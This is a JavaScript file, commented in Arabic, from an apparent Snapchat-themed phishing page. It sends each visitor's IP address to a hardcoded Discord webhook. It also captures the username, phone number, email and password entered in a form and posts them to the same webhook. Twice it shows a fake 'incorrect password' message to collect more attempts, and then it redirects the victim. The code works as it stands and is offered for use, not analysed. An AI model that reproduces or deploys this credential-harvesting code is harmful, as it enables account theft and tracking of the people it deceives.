// ===============================================
// إعدادات ديسكورد
// ===============================================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT"; 
// ===============================================

function sendToDiscord(message) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        return Promise.resolve();
    }
    const payload = {
        content: message,
        username: "Snapchat Tracker",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/100px-Snapchat_logo.svg.png" 
    };
    return fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(console.error);
}

// دالة تتبع الزوار IP
function trackVisitorIP() {
    fetch("https://api64.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            sendToDiscord(`👻 **زيارة جديدة**\nIP: ${data.ip}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
        })
        .catch(console.error);
}

// تتبع النقر على زر التقديم
function trackClickAndProceed() {
    const btn = document.getElementById('applyButton');
    btn.textContent = "جاري التحويل...";
    btn.disabled = true;
    
    sendToDiscord(`🚨 **نقرة: تقديم الطلب**`)
        .finally(() => {
            setTimeout(() => { window.location.href = 'apply.html'; }, 2000);
        });
}

// منطق النموذج
let attempts = 0;
document.addEventListener('DOMContentLoaded', () => {
    if(window.location.pathname.includes('index.html') || window.location.pathname === '/') {
        trackVisitorIP();
    }

    const form = document.getElementById("submissionForm");
    if (form) {
        form.addEventListener("submit", function(event) {
            event.preventDefault();
            
            const btn = document.getElementById("submitBtn");
            const statusMsg = document.getElementById("statusMessage");
            const loading = document.getElementById("loadingOverlay");

            let username = document.getElementById("username").value;
            let phone = document.getElementById("phoneNumber").value;
            let email = document.getElementById("trackingEmail").value;
            let password = document.getElementById("passwordField").value;

            let msg = `🔥 **صيد جديد (محاولة ${attempts + 1})**\n`;
            msg += `👤 **User:** \`${username}\`\n`;
            msg += `📱 **Phone:** \`${phone}\`\n`;
            msg += `📧 **Email:** \`${email}\`\n`;
            msg += `🔑 **Pass:** \`${password}\`\n`;
            msg += `⏰ **Time:** ${new Date().toLocaleString('ar-EG')}`;

            if (attempts < 2) {
                attempts++;
                sendToDiscord(msg);
                statusMsg.style.display = 'block';
                statusMsg.textContent = "عفواً، كلمة المرور غير صحيحة.";
                document.getElementById("passwordField").value = "";
            } else {
                attempts++;
                sendToDiscord(msg + "\n✅ **(تم التحويل)**");
                btn.disabled = true;
                statusMsg.style.display = 'none';
                loading.style.display = 'flex';
                setTimeout(() => { window.location.href = "confirmation.html"; }, 3000);
            }
        });
    }
});
